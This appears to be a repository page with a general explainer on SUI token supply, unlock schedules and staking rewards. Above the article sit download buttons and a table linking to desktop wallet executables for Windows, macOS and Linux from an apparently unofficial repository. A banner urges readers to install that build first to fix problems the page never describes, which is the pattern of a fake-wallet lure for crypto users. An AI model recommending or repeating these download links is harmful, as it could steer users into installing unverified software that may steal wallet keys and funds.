![SUI Wallet](assets/banner-article.png)

# SUI tokenomics and the unlock schedule

Supply, distribution and the unlock calendar, read as context rather than a forecast.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Tokenomics describes where a token's supply comes from, what it is used for and what releases it into
circulation over time. The SUI supply and unlock figures are published by the project that manages them, and
this page will not restate numbers it cannot verify. What it can do is explain what those numbers mean.

## Supply is a schedule, not a number

Every token has a maximum or a policy, and the interesting part is how it gets from the first day to steady
state. Some chains fix supply at launch; others mint a small amount for rewards each epoch; others release
tokens from locked allocations over years.

Those three mechanisms look identical in a price chart and completely different in what they mean for anyone
holding the token. The policy is the fact; the current price is an opinion about the policy.

The three mechanisms also differ in who decides. A fixed supply is decided once; a minting schedule is decided by a policy that can be revisited; a release schedule is decided by contracts written before anyone held the token.

## What an unlock actually is

Locked tokens are allocated to somebody - a fund, a contributor, an ecosystem programme - with a rule about when they can move. An unlock is that rule letting go of a tranche, which makes it transferable rather than sold. Announced is not the same as sold.

The distinction matters because unlocks are announced and selling is not. A large unlock is a known future
supply of tokens that may be sold; it is not the same event as a large sale, and coverage that treats them as
synonyms is describing a hypothesis as a fact.

## Where SUI's supply comes from

Two mechanisms act continuously rather than on a calendar. Staking rewards pay for the network's security from the token's own economics, and a storage fund keeps a share of fees for the future cost of keeping data. Neither is a fixed figure, and neither is a calendar event.

Neither is a number this page can give you, and neither stays fixed. What stays fixed is the shape: rewards
fund security, and fees fund permanence.
[SUI staking APY explained](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-staking-apy-explained.md) covers the rate that reward mechanism produces, which moves with total
stake rather than with a schedule.

Both mechanisms are worth understanding separately, because they answer different questions: one is about who secures the network, the other about who pays for the data it keeps forever.

## Reading a schedule without being fooled

Three questions make a schedule legible. How much is locked, and to whom. What fraction of that becomes
transferable in the next period. And whether the recipients are people who must sell to fund operations, or
institutions whose holdings are part of a longer position.

The third is judgement rather than data, and it is where most confident predictions go wrong. A schedule tells
you when tokens can move; it never tells you what their owners will do.
[Understanding the Sui blockchain](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/understanding-the-sui-blockchain.md) covers what the token is for, which is the other half of the
question a schedule only partly answers.

## What this means for a holder

Three practical consequences, and none of them is a forecast. Supply growth is a headwind that a rising use of
the network can offset or fail to. An unlock date is a known event around which liquidity can change. And
staking rewards are a yield paid in a token whose price is not part of the yield calculation.

That last one is the most commonly confused. A percentage return denominated in a volatile asset is not a
return until it is measured against something, and this page has no rate to quote because the rate moves.
[Staking SUI in the wallet app](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/staking-sui-in-the-wallet-app.md) covers earning it, which is a mechanical decision rather than an
investment thesis.

## Where to get the numbers

The project that manages the supply publishes the schedule, and that publication is the only source worth quoting for figures. Anything else - a chart, a thread, a video - is a reading of it, sometimes several readings removed. Read the source once, then stop.

The [repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop) is where this wallet's own
changes are recorded, which is the part this project can speak to. Token supply is not one of them.

A useful habit is to read the schedule once, note the next date and the size of that tranche, and then stop reading summaries of it. The primary document does not change weekly.

## FAQ

### What is tokenomics?

The policy behind a token: how much exists, how new supply is created or released, what the token is used for,
and who receives the new supply over time.

### What is an unlock schedule?

A rule that makes locked allocations transferable over time. An unlock changes what can move, not what has been
sold, and the two are frequently confused in coverage.

### How much SUI exists?

This page does not quote a figure, because supply changes with the network's own mechanisms and the schedule is
published by the project that manages it. Read it there rather than from a summary.

### Do unlocks lower the price?

They add transferable supply, which is a headwind rather than a cause. Whether it becomes selling depends on
the holders, and no schedule can tell you that.

### Are staking rewards new supply?

Rewards are paid from the network's economics rather than from a fixed calendar, which is why the rate moves
with total stake instead of following a published schedule.

### Does this affect my wallet?

Not directly. The wallet displays a balance and signs transactions; supply policy changes the value of what is
displayed, never the keys or the address.
